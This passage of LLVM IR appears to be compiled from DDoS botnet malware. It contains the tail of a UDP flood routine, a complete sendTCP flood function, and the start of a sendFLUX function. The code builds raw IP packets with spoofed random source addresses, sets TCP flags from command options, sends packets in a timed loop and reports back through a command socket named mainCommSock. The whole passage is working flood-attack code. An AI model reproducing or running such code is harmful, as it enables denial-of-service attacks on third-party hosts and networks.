  %188 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i32 0, i32 0
  %190 = bitcast %union.anon.2* %189 to %struct.anon.3*
  %191 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %190, i32 0, i32 0
  store i16 %187, i16* %191, align 2
  %192 = load i32, i32* %10, align 4
  %193 = icmp eq i32 %192, 0
  br i1 %193, label %194, label %196

; <label>:194:                                    ; preds = %155
  %195 = call i32 @rand_cmwc()
  br label %201

; <label>:196:                                    ; preds = %155
  %197 = load i32, i32* %10, align 4
  %198 = trunc i32 %197 to i16
  %199 = call zeroext i16 @htons(i16 zeroext %198) #13
  %200 = zext i16 %199 to i32
  br label %201

; <label>:201:                                    ; preds = %196, %194
  %202 = phi i32 [ %195, %194 ], [ %200, %196 ]
  %203 = trunc i32 %202 to i16
  %204 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %205 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %204, i32 0, i32 0
  %206 = bitcast %union.anon.2* %205 to %struct.anon.3*
  %207 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %206, i32 0, i32 1
  store i16 %203, i16* %207, align 2
  %208 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %209 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %208, i32 0, i32 0
  %210 = bitcast %union.anon.2* %209 to %struct.anon.3*
  %211 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %210, i32 0, i32 3
  store i16 0, i16* %211, align 2
  %212 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %213 = bitcast %struct.udphdr* %212 to i8*
  %214 = getelementptr inbounds i8, i8* %213, i64 8
  %215 = load i32, i32* %13, align 4
  call void @RandString(i8* %214, i32 %215)
  %216 = bitcast i8* %160 to i16*
  %217 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 2
  %219 = load i16, i16* %218, align 2
  %220 = zext i16 %219 to i32
  %221 = call zeroext i16 @csum(i16* %216, i32 %220)
  %222 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 7
  store i16 %221, i16* %223, align 2
  %224 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %225 = load i32, i32* %11, align 4
  %226 = add nsw i32 %224, %225
  store i32 %226, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %227

; <label>:227:                                    ; preds = %290, %286, %279, %201
  br label %228

; <label>:228:                                    ; preds = %227
  %229 = load i32, i32* %24, align 4
  %230 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %231 = call i64 @sendto(i32 %229, i8* %160, i64 %158, i32 0, %struct.sockaddr* %230, i32 16)
  %232 = call i32 @rand_cmwc()
  %233 = trunc i32 %232 to i16
  %234 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  %236 = bitcast %union.anon.2* %235 to %struct.anon.3*
  %237 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %236, i32 0, i32 0
  store i16 %233, i16* %237, align 2
  %238 = load i32, i32* %10, align 4
  %239 = icmp eq i32 %238, 0
  br i1 %239, label %240, label %242

; <label>:240:                                    ; preds = %228
  %241 = call i32 @rand_cmwc()
  br label %247

; <label>:242:                                    ; preds = %228
  %243 = load i32, i32* %10, align 4
  %244 = trunc i32 %243 to i16
  %245 = call zeroext i16 @htons(i16 zeroext %244) #13
  %246 = zext i16 %245 to i32
  br label %247

; <label>:247:                                    ; preds = %242, %240
  %248 = phi i32 [ %241, %240 ], [ %246, %242 ]
  %249 = trunc i32 %248 to i16
  %250 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 0
  %252 = bitcast %union.anon.2* %251 to %struct.anon.3*
  %253 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %252, i32 0, i32 1
  store i16 %249, i16* %253, align 2
  %254 = call i32 @rand_cmwc()
  %255 = trunc i32 %254 to i16
  %256 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i32 0, i32 3
  store i16 %255, i16* %257, align 4
  %258 = load i32, i32* %27, align 4
  %259 = call i32 @GetRandomIP(i32 %258)
  %260 = call i32 @htonl(i32 %259) #13
  %261 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i32 0, i32 8
  store i32 %260, i32* %262, align 4
  %263 = bitcast i8* %160 to i16*
  %264 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 2
  %266 = load i16, i16* %265, align 2
  %267 = zext i16 %266 to i32
  %268 = call zeroext i16 @csum(i16* %263, i32 %267)
  %269 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 7
  store i16 %268, i16* %270, align 2
  %271 = load i32, i32* %32, align 4
  %272 = load i32, i32* %18, align 4
  %273 = icmp eq i32 %271, %272
  br i1 %273, label %274, label %280

; <label>:274:                                    ; preds = %247
  %275 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %276 = load i32, i32* %31, align 4
  %277 = icmp sgt i32 %275, %276
  br i1 %277, label %278, label %279

; <label>:278:                                    ; preds = %274
  br label %293

; <label>:279:                                    ; preds = %274
  store i32 0, i32* %32, align 4
  br label %227

; <label>:280:                                    ; preds = %247
  %281 = load i32, i32* %32, align 4
  %282 = add i32 %281, 1
  store i32 %282, i32* %32, align 4
  %283 = load i32, i32* %33, align 4
  %284 = load i32, i32* %15, align 4
  %285 = icmp eq i32 %283, %284
  br i1 %285, label %286, label %290

; <label>:286:                                    ; preds = %280
  %287 = load i32, i32* %16, align 4
  %288 = mul nsw i32 %287, 1000
  %289 = call i32 @usleep(i32 %288)
  store i32 0, i32* %33, align 4
  br label %227

; <label>:290:                                    ; preds = %280
  %291 = load i32, i32* %33, align 4
  %292 = add i32 %291, 1
  store i32 %292, i32* %33, align 4
  br label %227

; <label>:293:                                    ; preds = %278
  %294 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %294)
  br label %295

; <label>:295:                                    ; preds = %293, %132, %124, %119, %72, %62, %51
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

declare i32 @usleep(i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %339

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i32 0, i32 0))
  br label %339

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #2
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.88, i32 0, i32 0))
  br label %339

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %72

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = sub nsw i32 32, %67
  %69 = shl i32 1, %68
  %70 = sub nsw i32 %69, 1
  %71 = xor i32 %70, -1
  store i32 %71, i32* %19, align 4
  br label %72

; <label>:72:                                     ; preds = %66, %65
  %73 = load i32, i32* %13, align 4
  %74 = sext i32 %73 to i64
  %75 = add i64 40, %74
  %76 = call i8* @llvm.stacksave()
  store i8* %76, i8** %20, align 8
  %77 = alloca i8, i64 %75, align 16
  %78 = bitcast i8* %77 to %struct.iphdr*
  store %struct.iphdr* %78, %struct.iphdr** %21, align 8
  %79 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %80 = bitcast %struct.iphdr* %79 to i8*
  %81 = getelementptr i8, i8* %80, i64 20
  %82 = bitcast i8* %81 to %struct.tcphdr*
  store %struct.tcphdr* %82, %struct.tcphdr** %22, align 8
  %83 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %84 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %85 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %84, i32 0, i32 0
  %86 = load i32, i32* %85, align 4
  %87 = load i32, i32* %19, align 4
  %88 = call i32 @GetRandomIP(i32 %87)
  %89 = call i32 @htonl(i32 %88) #13
  %90 = load i32, i32* %13, align 4
  %91 = sext i32 %90 to i64
  %92 = add i64 20, %91
  %93 = trunc i64 %92 to i32
  call void @makeIPPacket(%struct.iphdr* %83, i32 %86, i32 %89, i8 zeroext 6, i32 %93)
  %94 = call i32 @rand_cmwc()
  %95 = trunc i32 %94 to i16
  %96 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %97 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %96, i32 0, i32 0
  %98 = bitcast %union.anon.0* %97 to %struct.anon.1*
  %99 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %98, i32 0, i32 0
  store i16 %95, i16* %99, align 4
  %100 = call i32 @rand_cmwc()
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.0* %102 to %struct.anon.1*
  %104 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %103, i32 0, i32 2
  store i32 %100, i32* %104, align 4
  %105 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %106 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon.0* %106 to %struct.anon.1*
  %108 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %107, i32 0, i32 3
  store i32 0, i32* %108, align 4
  %109 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %110 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %109, i32 0, i32 0
  %111 = bitcast %union.anon.0* %110 to %struct.anon.1*
  %112 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %111, i32 0, i32 4
  %113 = load i16, i16* %112, align 4
  %114 = and i16 %113, -241
  %115 = or i16 %114, 80
  store i16 %115, i16* %112, align 4
  %116 = load i8*, i8** %12, align 8
  %117 = call i32 @strcmp(i8* %116, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i32 0, i32 0)) #10
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %155, label %119

; <label>:119:                                    ; preds = %72
  %120 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %121 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %120, i32 0, i32 0
  %122 = bitcast %union.anon.0* %121 to %struct.anon.1*
  %123 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %122, i32 0, i32 4
  %124 = load i16, i16* %123, align 4
  %125 = and i16 %124, -513
  %126 = or i16 %125, 512
  store i16 %126, i16* %123, align 4
  %127 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %128 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.0* %128 to %struct.anon.1*
  %130 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %129, i32 0, i32 4
  %131 = load i16, i16* %130, align 4
  %132 = and i16 %131, -1025
  %133 = or i16 %132, 1024
  store i16 %133, i16* %130, align 4
  %134 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %134, i32 0, i32 0
  %136 = bitcast %union.anon.0* %135 to %struct.anon.1*
  %137 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %136, i32 0, i32 4
  %138 = load i16, i16* %137, align 4
  %139 = and i16 %138, -257
  %140 = or i16 %139, 256
  store i16 %140, i16* %137, align 4
  %141 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i32 0, i32 0
  %143 = bitcast %union.anon.0* %142 to %struct.anon.1*
  %144 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %143, i32 0, i32 4
  %145 = load i16, i16* %144, align 4
  %146 = and i16 %145, -4097
  %147 = or i16 %146, 4096
  store i16 %147, i16* %144, align 4
  %148 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %148, i32 0, i32 0
  %150 = bitcast %union.anon.0* %149 to %struct.anon.1*
  %151 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %150, i32 0, i32 4
  %152 = load i16, i16* %151, align 4
  %153 = and i16 %152, -2049
  %154 = or i16 %153, 2048
  store i16 %154, i16* %151, align 4
  br label %232

; <label>:155:                                    ; preds = %72
  %156 = load i8*, i8** %12, align 8
  %157 = call i8* @strtok(i8* %156, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0)) #2
  store i8* %157, i8** %23, align 8
  br label %158

; <label>:158:                                    ; preds = %229, %155
  %159 = load i8*, i8** %23, align 8
  %160 = icmp ne i8* %159, null
  br i1 %160, label %161, label %231

; <label>:161:                                    ; preds = %158
  %162 = load i8*, i8** %23, align 8
  %163 = call i32 @strcmp(i8* %162, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.91, i32 0, i32 0)) #10
  %164 = icmp ne i32 %163, 0
  br i1 %164, label %173, label %165

; <label>:165:                                    ; preds = %161
  %166 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %167 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %166, i32 0, i32 0
  %168 = bitcast %union.anon.0* %167 to %struct.anon.1*
  %169 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %168, i32 0, i32 4
  %170 = load i16, i16* %169, align 4
  %171 = and i16 %170, -513
  %172 = or i16 %171, 512
  store i16 %172, i16* %169, align 4
  br label %229

; <label>:173:                                    ; preds = %161
  %174 = load i8*, i8** %23, align 8
  %175 = call i32 @strcmp(i8* %174, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.92, i32 0, i32 0)) #10
  %176 = icmp ne i32 %175, 0
  br i1 %176, label %185, label %177

; <label>:177:                                    ; preds = %173
  %178 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %179 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon.0* %179 to %struct.anon.1*
  %181 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %180, i32 0, i32 4
  %182 = load i16, i16* %181, align 4
  %183 = and i16 %182, -1025
  %184 = or i16 %183, 1024
  store i16 %184, i16* %181, align 4
  br label %228

; <label>:185:                                    ; preds = %173
  %186 = load i8*, i8** %23, align 8
  %187 = call i32 @strcmp(i8* %186, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.93, i32 0, i32 0)) #10
  %188 = icmp ne i32 %187, 0
  br i1 %188, label %197, label %189

; <label>:189:                                    ; preds = %185
  %190 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  %192 = bitcast %union.anon.0* %191 to %struct.anon.1*
  %193 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -257
  %196 = or i16 %195, 256
  store i16 %196, i16* %193, align 4
  br label %227

; <label>:197:                                    ; preds = %185
  %198 = load i8*, i8** %23, align 8
  %199 = call i32 @strcmp(i8* %198, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.94, i32 0, i32 0)) #10
  %200 = icmp ne i32 %199, 0
  br i1 %200, label %209, label %201

; <label>:201:                                    ; preds = %197
  %202 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 0
  %204 = bitcast %union.anon.0* %203 to %struct.anon.1*
  %205 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %206, -4097
  %208 = or i16 %207, 4096
  store i16 %208, i16* %205, align 4
  br label %226

; <label>:209:                                    ; preds = %197
  %210 = load i8*, i8** %23, align 8
  %211 = call i32 @strcmp(i8* %210, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.95, i32 0, i32 0)) #10
  %212 = icmp ne i32 %211, 0
  br i1 %212, label %221, label %213

; <label>:213:                                    ; preds = %209
  %214 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.0* %215 to %struct.anon.1*
  %217 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = and i16 %218, -2049
  %220 = or i16 %219, 2048
  store i16 %220, i16* %217, align 4
  br label %225

; <label>:221:                                    ; preds = %209
  %222 = load i32, i32* @mainCommSock, align 4
  %223 = load i8*, i8** %23, align 8
  %224 = call i32 (i32, i8*, ...) @sockprintf(i32 %222, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.96, i32 0, i32 0), i8* %223)
  br label %225

; <label>:225:                                    ; preds = %221, %213
  br label %226

; <label>:226:                                    ; preds = %225, %201
  br label %227

; <label>:227:                                    ; preds = %226, %189
  br label %228

; <label>:228:                                    ; preds = %227, %177
  br label %229

; <label>:229:                                    ; preds = %228, %165
  %230 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %230, i8** %23, align 8
  br label %158

; <label>:231:                                    ; preds = %158
  br label %232

; <label>:232:                                    ; preds = %231, %119
  %233 = call i32 @rand_cmwc()
  %234 = trunc i32 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 0
  %237 = bitcast %union.anon.0* %236 to %struct.anon.1*
  %238 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %237, i32 0, i32 5
  store i16 %234, i16* %238, align 2
  %239 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 0
  %241 = bitcast %union.anon.0* %240 to %struct.anon.1*
  %242 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %241, i32 0, i32 6
  store i16 0, i16* %242, align 4
  %243 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 0
  %245 = bitcast %union.anon.0* %244 to %struct.anon.1*
  %246 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %245, i32 0, i32 7
  store i16 0, i16* %246, align 2
  %247 = load i32, i32* %9, align 4
  %248 = icmp eq i32 %247, 0
  br i1 %248, label %249, label %251

; <label>:249:                                    ; preds = %232
  %250 = call i32 @rand_cmwc()
  br label %256

; <label>:251:                                    ; preds = %232
  %252 = load i32, i32* %9, align 4
  %253 = trunc i32 %252 to i16
  %254 = call zeroext i16 @htons(i16 zeroext %253) #13
  %255 = zext i16 %254 to i32
  br label %256

; <label>:256:                                    ; preds = %251, %249
  %257 = phi i32 [ %250, %249 ], [ %255, %251 ]
  %258 = trunc i32 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 0
  %261 = bitcast %union.anon.0* %260 to %struct.anon.1*
  %262 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %261, i32 0, i32 1
  store i16 %258, i16* %262, align 2
  %263 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %264 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %265 = call zeroext i16 @tcpcsum(%struct.iphdr* %263, %struct.tcphdr* %264)
  %266 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 0
  %268 = bitcast %union.anon.0* %267 to %struct.anon.1*
  %269 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %268, i32 0, i32 6
  store i16 %265, i16* %269, align 4
  %270 = bitcast i8* %77 to i16*
  %271 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 2
  %273 = load i16, i16* %272, align 2
  %274 = zext i16 %273 to i32
  %275 = call zeroext i16 @csum(i16* %270, i32 %274)
  %276 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 7
  store i16 %275, i16* %277, align 2
  %278 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %279 = load i32, i32* %10, align 4
  %280 = add nsw i32 %278, %279
  store i32 %280, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %281

; <label>:281:                                    ; preds = %334, %333, %256
  br label %282

; <label>:282:                                    ; preds = %281
  %283 = load i32, i32* %17, align 4
  %284 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %285 = call i64 @sendto(i32 %283, i8* %77, i64 %75, i32 0, %struct.sockaddr* %284, i32 16)
  %286 = load i32, i32* %19, align 4
  %287 = call i32 @GetRandomIP(i32 %286)
  %288 = call i32 @htonl(i32 %287) #13
  %289 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 8
  store i32 %288, i32* %290, align 4
  %291 = call i32 @rand_cmwc()
  %292 = trunc i32 %291 to i16
  %293 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %294 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %293, i32 0, i32 3
  store i16 %292, i16* %294, align 4
  %295 = call i32 @rand_cmwc()
  %296 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 0
  %298 = bitcast %union.anon.0* %297 to %struct.anon.1*
  %299 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %298, i32 0, i32 2
  store i32 %295, i32* %299, align 4
  %300 = call i32 @rand_cmwc()
  %301 = trunc i32 %300 to i16
  %302 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 0
  %304 = bitcast %union.anon.0* %303 to %struct.anon.1*
  %305 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %304, i32 0, i32 0
  store i16 %301, i16* %305, align 4
  %306 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %307 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %306, i32 0, i32 0
  %308 = bitcast %union.anon.0* %307 to %struct.anon.1*
  %309 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %308, i32 0, i32 6
  store i16 0, i16* %309, align 4
  %310 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %311 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %312 = call zeroext i16 @tcpcsum(%struct.iphdr* %310, %struct.tcphdr* %311)
  %313 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %314 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %313, i32 0, i32 0
  %315 = bitcast %union.anon.0* %314 to %struct.anon.1*
  %316 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %315, i32 0, i32 6
  store i16 %312, i16* %316, align 4
  %317 = bitcast i8* %77 to i16*
  %318 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %319 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %318, i32 0, i32 2
  %320 = load i16, i16* %319, align 2
  %321 = zext i16 %320 to i32
  %322 = call zeroext i16 @csum(i16* %317, i32 %321)
  %323 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 7
  store i16 %322, i16* %324, align 2
  %325 = load i32, i32* %25, align 4
  %326 = load i32, i32* %15, align 4
  %327 = icmp eq i32 %325, %326
  br i1 %327, label %328, label %334

; <label>:328:                                    ; preds = %282
  %329 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %330 = load i32, i32* %24, align 4
  %331 = icmp sgt i32 %329, %330
  br i1 %331, label %332, label %333

; <label>:332:                                    ; preds = %328
  br label %337

; <label>:333:                                    ; preds = %328
  store i32 0, i32* %25, align 4
  br label %281

; <label>:334:                                    ; preds = %282
  %335 = load i32, i32* %25, align 4
  %336 = add i32 %335, 1
  store i32 %336, i32* %25, align 4
  br label %281

; <label>:337:                                    ; preds = %332
  %338 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %338)
  br label %339

; <label>:339:                                    ; preds = %337, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendFLUX(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca %struct.iphdr*, align 8
  %20 = alloca %struct.tcphdr*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
